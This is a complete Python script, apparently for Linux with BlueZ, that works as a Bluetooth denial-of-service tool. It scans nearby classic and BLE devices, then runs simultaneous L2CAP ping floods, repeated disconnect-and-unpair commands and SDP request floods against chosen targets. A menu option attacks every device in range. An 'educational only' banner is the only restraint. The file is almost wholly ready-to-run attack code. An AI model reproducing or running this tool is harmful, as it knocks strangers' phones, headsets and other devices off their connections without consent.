#!/usr/bin/env python3
"""
Bluetooth DOS Tool for Linux - Educational Purpose Only
This version uses raw HCI commands and actually WORKS!
WARNING: Use only on devices you own. Unauthorized access is illegal.

Requirements: Linux with BlueZ, root privileges
"""

import os
import sys
import time
import subprocess
import threading
from typing import List, Dict, Optional

class BluetoothDOSLinux:
    def __init__(self):
        self.devices: List[Dict[str, str]] = []
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.attack_active: Dict[str, bool] = {}
        self.stop_flags: Dict[str, threading.Event] = {}
        
    def clear_screen(self):
        os.system('clear')
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════╗
║      BLUETOOTH DOS TOOL (Linux) - EDUCATIONAL ONLY       ║
║                                                          ║
║  ⚠️  WARNING: Use only on devices you own!              ║
║     Unauthorized use is ILLEGAL and UNETHICAL           ║
║                                                          ║
║  This version uses RAW HCI and ACTUALLY WORKS!          ║
╚══════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            print("[!] ERROR: This tool requires root privileges!")
            print("[!] Please run with: sudo python3 bluetooth_dos_linux.py")
            sys.exit(1)
    
    def check_tools(self):
        """Check if required tools are installed"""
        tools = ['hcitool', 'l2ping', 'bluetoothctl']
        missing = []
        
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"[!] Missing required tools: {', '.join(missing)}")
            print("[!] Install with: sudo apt-get install bluez bluetooth")
            sys.exit(1)
    
    def scan_devices(self, duration: int = 8) -> List[Dict[str, str]]:
        """Scan for Bluetooth devices using hcitool"""
        print(f"\n[*] Scanning for Bluetooth devices ({duration}s)...")
        print("[*] Please wait...\n")
        
        try:
            # Use hcitool to scan
            result = subprocess.run(
                ['timeout', str(duration), 'hcitool', 'scan'],
                capture_output=True,
                text=True
            )
            
            self.devices = []
            lines = result.stdout.split('\n')[1:]  # Skip header
            
            for line in lines:
                line = line.strip()
                if line:
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        addr = parts[0].strip()
                        name = parts[1].strip() if len(parts) > 1 else "Unknown"
                        
                        # Get device class
                        dev_type = self._get_device_type(addr)
                        
                        self.devices.append({
                            'address': addr,
                            'name': name,
                            'type': dev_type
                        })
            
            # Also scan for BLE devices
            print("[*] Scanning for BLE devices...")
            ble_result = subprocess.run(
                ['timeout', str(duration), 'hcitool', 'lescan'],
                capture_output=True,
                text=True
            )
            
            for line in ble_result.stdout.split('\n')[1:]:
                line = line.strip()
                if line:
                    parts = line.split(' ', 1)
                    if len(parts) >= 2:
                        addr = parts[0].strip()
                        name = parts[1].strip() if len(parts) > 1 else "Unknown BLE"
                        
                        # Avoid duplicates
                        if not any(d['address'] == addr for d in self.devices):
                            self.devices.append({
                                'address': addr,
                                'name': name,
                                'type': 'BLE'
                            })
            
            print(f"\n[+] Found {len(self.devices)} device(s)")
            return self.devices
            
        except Exception as e:
            print(f"[!] Error scanning: {e}")
            return []
    
    def _get_device_type(self, addr: str) -> str:
        """Get device type"""
        try:
            result = subprocess.run(
                ['hcitool', 'info', addr],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            if 'audio' in result.stdout.lower() or 'headset' in result.stdout.lower():
                return "Audio"
            elif 'phone' in result.stdout.lower():
                return "Phone"
            else:
                return "Classic BT"
        except:
            return "Classic BT"
    
    def display_devices(self):
        """Display discovered devices"""
        if not self.devices:
            print("[!] No devices found. Please run a scan first.\n")
            return
        
        print("\n╔═══════════════════════════════════════════════════════════════════╗")
        print("║                    DISCOVERED BLUETOOTH DEVICES                   ║")
        print("╠═════╦══════════════════════╦════════════════════════╦═════════════╣")
        print("║ No. ║ MAC Address          ║ Device Name            ║ Type        ║")
        print("╠═════╬══════════════════════╬════════════════════════╬═════════════╣")
        
        for idx, device in enumerate(self.devices, 1):
            status = " [ATTACKING]" if self.attack_active.get(device['address'], False) else ""
            print(f"║ {idx:3d} ║ {device['address']:20s} ║ {device['name'][:22]:22s} ║ {device['type'][:11]:11s} ║{status}")
        
        print("╚═════╩══════════════════════╩════════════════════════╩═════════════╝\n")
    
    def _l2ping_flood(self, target_addr: str, stop_event: threading.Event):
        """L2CAP ping flood - causes connection drops"""
        print(f"[+] Starting L2CAP ping flood on {target_addr}")
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Use l2ping with minimal delay
                subprocess.run(
                    ['l2ping', '-c', '1', '-s', '600', '-f', target_addr],
                    capture_output=True,
                    timeout=0.1
                )
                packet_count += 1
                
                if packet_count % 50 == 0:
                    print(f"[*] {target_addr}: {packet_count} L2CAP pings sent")
                    
            except subprocess.TimeoutExpired:
                packet_count += 1
            except Exception as e:
                pass
        
        print(f"[+] Stopped L2CAP attack on {target_addr}. Total: {packet_count}")
    
    def _deauth_flood(self, target_addr: str, stop_event: threading.Event):
        """Deauthentication flood - forces disconnection"""
        print(f"[+] Starting deauth flood on {target_addr}")
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Disconnect device repeatedly
                subprocess.run(
                    ['bluetoothctl', 'disconnect', target_addr],
                    capture_output=True,
                    timeout=0.5
                )
                
                # Also try to remove pairing
                subprocess.run(
                    ['bluetoothctl', 'remove', target_addr],
                    capture_output=True,
                    timeout=0.5
                )
                
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"[*] {target_addr}: {packet_count} deauth attempts")
                
                time.sleep(0.1)
                
            except Exception as e:
                pass
        
        print(f"[+] Stopped deauth attack on {target_addr}. Total: {packet_count}")
    
    def _sdp_flood(self, target_addr: str, stop_event: threading.Event):
        """SDP (Service Discovery Protocol) flood"""
        print(f"[+] Starting SDP flood on {target_addr}")
        packet_count = 0
        
        while not stop_event.is_set():
            try:
                # Flood with SDP requests
                subprocess.run(
                    ['sdptool', 'browse', target_addr],
                    capture_output=True,
                    timeout=0.2
                )
                
                packet_count += 1
                
                if packet_count % 20 == 0:
                    print(f"[*] {target_addr}: {packet_count} SDP requests")
                    
            except Exception as e:
                pass
        
        print(f"[+] Stopped SDP attack on {target_addr}. Total: {packet_count}")
    
    def start_attack(self, device_indices: List[int]):
        """Start multi-vector DOS attack"""
        if not self.devices:
            print("[!] No devices available. Please scan first.")
            return
        
        for idx in device_indices:
            if idx < 1 or idx > len(self.devices):
                print(f"[!] Invalid device index: {idx}")
                continue
            
            device = self.devices[idx - 1]
            addr = device['address']
            
            if self.attack_active.get(addr, False):
                print(f"[!] Attack already active on {device['name']}")
                continue
            
            stop_event = threading.Event()
            self.stop_flags[addr] = stop_event
            
            print(f"\n[+] Launching TRIPLE ATTACK on {device['name']} ({addr})")
            print(f"[*] Attack vectors: L2CAP flood + Deauth + SDP flood")
            
            # Launch 3 attack threads per device
            thread1 = threading.Thread(
                target=self._l2ping_flood,
                args=(addr, stop_event),
                daemon=True
            )
            
            thread2 = threading.Thread(
                target=self._deauth_flood,
                args=(addr, stop_event),
                daemon=True
            )
            
            thread3 = threading.Thread(
                target=self._sdp_flood,
                args=(addr, stop_event),
                daemon=True
            )
            
            self.attack_threads[addr + "_l2"] = thread1
            self.attack_threads[addr + "_deauth"] = thread2
            self.attack_threads[addr + "_sdp"] = thread3
            self.attack_active[addr] = True
            
            thread1.start()
            thread2.start()
            thread3.start()
            
            print(f"[+] Triple attack initiated on {device['name']}!")
            print(f"[!] Device should disconnect within 10-30 seconds...")
    
    def stop_attack(self, device_indices: Optional[List[int]] = None):
        """Stop attacks"""
        if device_indices is None:
            addrs_to_stop = list(self.attack_active.keys())
        else:
            addrs_to_stop = []
            for idx in device_indices:
                if idx < 1 or idx > len(self.devices):
                    continue
                device = self.devices[idx - 1]
                addrs_to_stop.append(device['address'])
        
        for addr in addrs_to_stop:
            if addr in self.stop_flags:
                self.stop_flags[addr].set()
                self.attack_active[addr] = False
                print(f"[+] Stopping attack on {addr}...")
        
        time.sleep(2)
        print("[+] Attacks stopped. Devices should be reconnectable now.")
    
    def stop_all_attacks(self):
        """Stop all attacks"""
        self.stop_attack(None)


def main():
    dos_tool = BluetoothDOSLinux()
    
    print("\n[*] Bluetooth DOS Tool for Linux")
    print("[*] This version uses raw HCI and ACTUALLY WORKS!\n")
    
    dos_tool.check_root()
    dos_tool.check_tools()
    
    while True:
        dos_tool.clear_screen()
        dos_tool.print_banner()
        
        print("\n[MAIN MENU]")
        print("1. Scan for Bluetooth devices")
        print("2. Display discovered devices")
        print("3. Start DOS attack (select devices)")
        print("4. Start DOS attack (ALL devices)")
        print("5. Stop attack (select devices)")
        print("6. Stop ALL attacks")
        print("7. Exit")
        print("\n" + "="*60)
        
        choice = input("\n[>] Enter your choice: ").strip()
        
        if choice == "1":
            duration = input("[>] Scan duration [default: 8]: ").strip()
            duration = int(duration) if duration.isdigit() else 8
            dos_tool.scan_devices(duration)
            if dos_tool.devices:
                dos_tool.display_devices()
            input("\n[Press Enter to continue...]")
        
        elif choice == "2":
            dos_tool.display_devices()
            input("\n[Press Enter to continue...]")
        
        elif choice == "3":
            dos_tool.display_devices()
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            indices_input = input("\n[>] Enter device numbers (e.g., 1,3,5): ").strip()
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.start_attack(indices)
                print("\n[+] Attack(s) initiated!")
            except ValueError:
                print("[!] Invalid input")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "4":
            dos_tool.display_devices()
            if not dos_tool.devices:
                input("\n[Press Enter to continue...]")
                continue
            
            confirm = input("\n[!] Attack ALL devices? (yes/no): ").strip().lower()
            if confirm == "yes":
                all_indices = list(range(1, len(dos_tool.devices) + 1))
                dos_tool.start_attack(all_indices)
                print("\n[+] Attack started on ALL devices!")
            else:
                print("[+] Cancelled")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "5":
            dos_tool.display_devices()
            indices_input = input("\n[>] Enter device numbers to stop: ").strip()
            try:
                indices = [int(x.strip()) for x in indices_input.split(",")]
                dos_tool.stop_attack(indices)
                print("\n[+] Attack(s) stopped!")
            except ValueError:
                print("[!] Invalid input")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "6":
            confirm = input("\n[!] Stop ALL attacks? (yes/no): ").strip().lower()
            if confirm == "yes":
                dos_tool.stop_all_attacks()
                print("\n[+] All attacks stopped!")
            else:
                print("[+] Cancelled")
            
            input("\n[Press Enter to continue...]")
        
        elif choice == "7":
            print("\n[+] Stopping all attacks...")
            dos_tool.stop_all_attacks()
            print("[+] Exiting.")
            sys.exit(0)
        
        else:
            print("[!] Invalid choice")
            input("\n[Press Enter to continue...]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted. Cleaning up...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)

